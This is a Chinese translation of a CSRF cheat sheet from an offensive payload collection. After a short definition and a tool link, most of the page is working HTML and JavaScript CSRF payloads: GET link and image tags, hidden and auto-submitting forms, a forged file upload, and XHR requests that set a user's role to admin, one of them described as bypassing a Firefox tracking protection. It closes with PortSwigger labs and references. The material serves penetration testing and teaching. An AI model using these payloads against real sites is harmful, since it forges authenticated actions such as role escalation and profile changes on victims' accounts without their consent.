[原文文档](README.en.md)

# 跨站请求伪造

> 跨站请求伪造（CSRF/XSRF）是一种攻击，强制最终用户在当前已认证的 Web 应用程序上执行不需要的操作。CSRF 攻击专门针对状态更改请求，而不是数据盗窃，因为攻击者无法看到伪造请求的响应。- OWASP

## 摘要

* [工具](#tools)
* [方法论](#methodology)
    * [HTML GET - 需要用户交互](#html-get---requiring-user-interaction)
    * [HTML GET - 无需用户交互](#html-get---no-user-interaction)
    * [HTML POST - 需要用户交互](#html-post---requiring-user-interaction)
    * [HTML POST - 自动提交 - 无需用户交互](#html-post---autosubmit---no-user-interaction)
    * [HTML POST - multipart/form-data 包含文件上传 - 需要用户交互](#html-post---multipartform-data-with-file-upload---requiring-user-interaction)
    * [JSON GET - 简单请求](#json-get---simple-request)
    * [JSON POST - 简单请求](#json-post---simple-request)
    * [JSON POST - 复杂请求](#json-post---complex-request)
* [实验环境](#labs)
* [参考资料](#references)

## 工具

* [0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe) - 主要的跨站请求伪造审计和利用工具包。

## 方法论

![CSRF_cheatsheet](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Cross-Site%20Request%20Forgery/Images/CSRF-CheatSheet.png)

当您登录某个网站时，通常会有一个会话。该会话的标识符存储在浏览器的 Cookie 中，并随着对该网站的每个请求一起发送。即使其他网站触发请求，Cookie 也会随请求一起发送，请求会被处理，就像已登录用户执行的一样。

### HTML GET - 需要用户交互

```html
<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
```

### HTML GET - 无需用户交互

```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```

### HTML POST - 需要用户交互

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
```

### HTML POST - 自动提交 - 无需用户交互

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

### HTML POST - multipart/form-data 包含文件上传 - 需要用户交互

```html
<script>
function launch(){
    const dT = new DataTransfer();
    const file = new File( [ "CSRF-filecontent" ], "CSRF-filename" );
    dT.items.add( file );
    document.xss[0].files = dT.files;

    document.xss.submit()
}
</script>

<form style="display: none" name="xss" method="post" action="<target>" enctype="multipart/form-data">
<input id="file" type="file" name="file"/>
<input type="submit" name="" value="" size="0" />
</form>
<button value="button" onclick="launch()">Submit Request</button>
```

### JSON GET - 简单请求

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

### JSON POST - 简单请求

使用 XHR：

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
// application/json 在简单请求中不被允许。text/plain 是默认值
xhr.setRequestHeader("Content-Type", "text/plain");
// 您可能还希望尝试其中一个或两个
// xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
// xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```

使用自动提交发送表单，这会绕过某些浏览器保护，如 Firefox 浏览器中的[增强跟踪保护](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection)的标准选项：

```html
<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
// 这个输入将发送：{"role":admin,"other":"="}
 <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
</form>
<script>
 document.getElementById("CSRF_POC").submit();
</script>
```

### JSON POST - 复杂请求

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

## 实验环境

* [PortSwigger - 无防御措施的 CSRF 漏洞](https://portswigger.net/web-security/csrf/lab-no-defenses)
* [PortSwigger - 令牌验证取决于请求方法的 CSRF](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)
* [PortSwigger - 令牌验证取决于令牌存在的 CSRF](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)
* [PortSwigger - 令牌未绑定到用户会话的 CSRF](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)
* [PortSwigger - 令牌绑定到非会话 Cookie 的 CSRF](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
* [PortSwigger - 令牌在 Cookie 中重复的 CSRF](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)
* [PortSwigger - Referer 验证取决于头部存在的 CSRF](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
* [PortSwigger - Referer 验证损坏的 CSRF](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)

## 参考资料

* [跨站请求伪造备忘单 - Alex Lauerman - 2016年4月3日](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
* [跨站请求伪造 (CSRF) - OWASP - 2024年4月19日](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
* [Messenger.com CSRF 在检查 CSRF 时向您显示步骤 - Jack Whitton - 2015年7月26日](https://whitton.io/articles/messenger-site-wide-csrf/)
* [Paypal 漏洞赏金：未经同意更新 Paypal.me 个人资料图片（CSRF 攻击） - Florian Courtial - 2016年7月19日](https://web.archive.org/web/20170607102958/https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/)
* [一键破解 PayPal 账户（已修复） - Yasser Ali - 2014/10/09](https://web.archive.org/web/20141203184956/http://yasserali.com/hacking-paypal-accounts-with-one-click/)
* [添加到收藏推文 CSRF - Vijay Kumar (indoappsec) - 2015年11月21日](https://hackerone.com/reports/100820)
* [Facebookmarketingdevelopers.com：代理、CSRF 困境和 API 乐趣 - phwd - 2015年10月16日](http://philippeharewood.com/facebookmarketingdevelopers-com-proxies-csrf-quandry-and-api-fun/)
* [我如何破解您的 Beats 账户？Apple 漏洞赏金 - @aaditya_purani - 2016/07/20](https://aadityapurani.com/2016/07/20/how-i-hacked-your-beats-account-apple-bug-bounty/)
* [表单 POST JSON：POST 心跳 API 上的 JSON CSRF - Eugene Yakovchuk - 2017年7月2日](https://hackerone.com/reports/245346)
* [使用 Oculus-Facebook 集成中的 CSRF 破解 Facebook 账户 - Josip Franjkovic - 2018年1月15日](https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)
* [跨站请求伪造 (CSRF) - Sjoerd Langkemper - 2019年1月9日](http://www.sjoerdlangkemper.nl/2019/01/09/csrf/)
* [跨站请求伪造攻击 - PwnFunction - 2019年4月5日](https://www.youtube.com/watch?v=eWEgUcHPle0)
* [消除 CSRF - Joe Rozner - 2017年10月17日](https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f)
* [绕过 CSRF 的 Referer 检查逻辑 - hahwul - 2019年10月11日](https://www.hahwul.com/2019/10/11/bypass-referer-check-logic-for-csrf/)